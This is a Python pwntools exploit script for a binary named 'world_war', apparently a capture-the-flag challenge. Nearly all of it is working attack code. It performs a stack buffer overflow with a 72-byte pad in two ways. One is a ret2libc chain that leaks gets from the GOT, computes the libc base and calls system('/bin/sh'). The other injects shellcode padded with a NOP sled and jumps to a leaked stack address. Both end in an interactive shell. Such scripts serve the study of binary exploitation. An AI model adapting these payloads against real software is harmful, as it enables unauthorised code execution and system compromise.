from pwn import *

class exploit():
    def ret2libc(self):
        binary = ELF("world_war")
        #p = remote("127.0.0.1", 8888)
        p = process("./world_war")
        hailibc = ELF("/lib/i386-linux-gnu/libc-2.27.so")     

        padding = 72
        printf_plt = p32(binary.symbols["plt.printf"])
        gets_got = p32(binary.symbols["got.gets"])
        main = p32(binary.symbols["main"])
        
        payload = "A" * padding
        payload += printf_plt
        payload += main
        payload += gets_got
        
        p.sendline(payload)
        p.recvuntil("-->We've got some Allies!\n")

        libc = u32(p.recv(4))
        log.info("Libc gets : {}".format(hex(libc)))
        base_libc = libc - hailibc.symbols["gets"]
        log.info("Libc base : {}".format(hex(base_libc)))
        system_libc = base_libc + hailibc.symbols["system"]
        log.info("Libc system : {}".format(hex(system_libc)))
        binsh_libc = base_libc + hailibc.search("/bin/sh").next()
        log.info("Libc binsh: {}".format(hex(binsh_libc)))
        
        payload = ""
        payload += "A" * padding
        payload += p32(system_libc)
        payload += "JUNK"
        payload += p32(binsh_libc)
        #gdb.attach(p, '''
        #            b *main+153
        #            c
        #            ''')

        p.sendline(payload)
        p.interactive()
    
    def shellcode(self):
        p = process("./world_war")
        shellcode = asm(shellcraft.sh())
        padding = 72

        p.recvuntil("coordinate : ")

        buff = int(p.recvline()[:-1], 16)
        payload = ''
        payload += shellcode + '\x90' * (padding - len(shellcode)) + p32(buff)

        p.sendline(payload)
        p.interactive()

if __name__ == "__main__":
    Exploit = exploit()
    #Exploit.ret2libc()
    Exploit.shellcode()
